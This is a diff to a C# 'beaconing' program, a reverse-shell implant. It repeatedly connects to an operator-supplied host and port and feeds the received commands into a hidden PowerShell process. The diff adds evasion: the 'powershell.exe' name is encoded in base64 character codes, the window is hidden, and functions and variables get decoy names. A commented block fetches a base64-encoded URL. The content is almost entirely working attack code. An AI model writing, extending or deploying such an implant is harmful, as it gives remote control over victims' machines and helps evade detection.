@@ -5,6 +5,7 @@ using System.Text;
 using System.Net.Sockets;
 using System.IO;
 using System.Diagnostics;
+using System.Net;
 
 namespace beaconing
 {
@@ -12,19 +13,36 @@ namespace beaconing
     {
         static StreamWriter writer;
         static StreamReader reader;
-        public static void Main(string[] args)
+        public static int Main(string[] args)
         {
-            String IP_Address = "127.0.0.1";
-            int Port = 1001;
+            String IP_Address = "";
+            int Port = 0;
+
+            if (args.Length == 0)
+            {
+                System.Console.WriteLine(@"Usage: .\beaconing.exe <host> <port>");
+                return 1;
+            }
+            else if (args.Length == 2)
+            {
+                IP_Address = args[0];
+                Port = Int32.Parse(args[1]);
+            }
+            else
+            {
+                System.Console.WriteLine(@"Usage: .\beaconing.exe <host> <port>");
+                return 1;
+            }
+
             while (true)
             {
                 Console.WriteLine("Sleeping...");
                 System.Threading.Thread.Sleep(10000);
                 Console.WriteLine("Calling GiveShell()");
-                GiveShell(IP_Address, Port);
+                PretAManger(IP_Address, Port);
             }
         }
-        public static void GiveShell(String IP_Address, int Port)
+        public static void PretAManger(String IP_Address, int Port)
         {
             TcpClient client = ConnectMeDaddy(IP_Address, Port);
 
@@ -36,26 +54,27 @@ namespace beaconing
                 reader = new StreamReader(stream);
 
                 StringBuilder StrInput = new StringBuilder();
-                Process p = new Process();
+                Process HiddenLettuce = new Process();
                 try
                 {
-                    Console.WriteLine("Starting PowerShell.exe");
-                    p.StartInfo.FileName = "powershell.exe";
-                    p.StartInfo.CreateNoWindow = false; // for debugging
-                    p.StartInfo.UseShellExecute = false;
+                    String MustardYellowJumper = KetteringTownFC();
+                    HiddenLettuce.StartInfo.FileName = MustardYellowJumper;
+                    Console.WriteLine(String.Format("Starting {0}!", MustardYellowJumper));
+                    HiddenLettuce.StartInfo.CreateNoWindow = true; // for debugging
+                    HiddenLettuce.StartInfo.UseShellExecute = false;
                     // https://stackoverflow.com/questions/5255086/when-do-we-need-to-set-useshellexecute-to-true
                     // https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo.useshellexecute?view=netframework-4.0
                     // Basically just means: "Gets or sets a value indicating whether to use the operating system shell to start the process."
-                    p.StartInfo.RedirectStandardOutput = true;
-                    p.StartInfo.RedirectStandardInput = true;
-                    p.StartInfo.RedirectStandardError = true;
-                    p.OutputDataReceived += new DataReceivedEventHandler(OutputHandler);
-                    p.Start();
-                    p.BeginOutputReadLine();
+                    HiddenLettuce.StartInfo.RedirectStandardOutput = true;
+                    HiddenLettuce.StartInfo.RedirectStandardInput = true;
+                    HiddenLettuce.StartInfo.RedirectStandardError = true;
+                    HiddenLettuce.OutputDataReceived += new DataReceivedEventHandler(OutputHandler);
+                    HiddenLettuce.Start();
+                    HiddenLettuce.BeginOutputReadLine();
                     while (true)
                     {
                         StrInput.Append(reader.ReadLine());
-                        p.StandardInput.WriteLine(StrInput);
+                        HiddenLettuce.StandardInput.WriteLine(StrInput);
                         StrInput.Remove(0, StrInput.Length);
                     }
                 }
@@ -70,19 +89,27 @@ namespace beaconing
                     reader.Close();
                     writer.Close();
                     client.Close();
-                    p.Close();
+                    HiddenLettuce.Close();
                 }
             }
-            
+            /**
+            else
+            {
+                String Repertoire = "aHR0cHM6Ly93d3cuamFtZXNhY2FzdGVyLmNvbS93cC1jb250ZW50L3VwbG9hZHMvMjAxNi8wOC9qYW1lczMuanBn";
+                using (var R = new WebClient())
+                {
+                    R.DownloadFile(Encoding.UTF8.GetString(Convert.FromBase64String(Repertoire)), "Repertoire.jpg");
+                }
+            }
+            **/
         }
-       public static TcpClient ConnectMeDaddy(String IP_Address, int Port)
+        public static TcpClient ConnectMeDaddy(String IP_Address, int Port)
         {
             Console.WriteLine(String.Format("Connecting to {0}:{1}", IP_Address, Port));
             TcpClient client = null;
-
             try
             {
-                
+
                 client = new TcpClient(IP_Address, Port);
             }
             catch
@@ -108,7 +135,58 @@ namespace beaconing
             }
         }
 
+        public static String KetteringTownFC() // @michaelranaldo and I were bored.
+        {
+            // https://www.youtube.com/watch?v=-JCfohAGRQ0
+            string y = "MTEyIDc5IDExOSA2OSAxMTQgODMgMTA0IDY5IDEwOCA3NiA0NiA2OSAxMjAgNjk=";
+            string z = "MTEyIDc5IDExOSA2OSAxMTQgODMgMTABanana0IDY5IDEwOCA3NiA0NiA2OSAxMjAgNjk=";
+
+            String p0 = Encoding.UTF8.GetString(Convert.FromBase64String(y));
+
+            string[] p1 = p0.Split(' ');
+
+            String Acaster = "";
+
+            foreach (var p in p1)
+            {
+                char c = Convert.ToChar(Int32.Parse(p));
+                string d = c.ToString();
+                Acaster += d;
+
+            }
+            Random random = new Random();
+            String BananaShop = "";
+
+            foreach (char c in Acaster)
+            {
+                int r = random.Next(0, 2);
+                var b = "";
+                switch (r)
+                {
+                    case 0:
+                        b = c.ToString().ToUpper();
+                        break;
+                    case 1:
+                        b = c.ToString().ToLower();
+                        break;
+                    case 2:
+                        b = "@";
+                        break;
+                    case 3:
+                        b = "its://";
+                        break;
+                    case 4:
+                        b = z.Substring(z.IndexOf("B"), z.LastIndexOf("a"));
+                        break;
+                    default:
+                        b = c.ToString();
+                        break;
+                }
+                BananaShop += b;
+            }
+            return BananaShop;
+        }
+
     }
 
 }
-
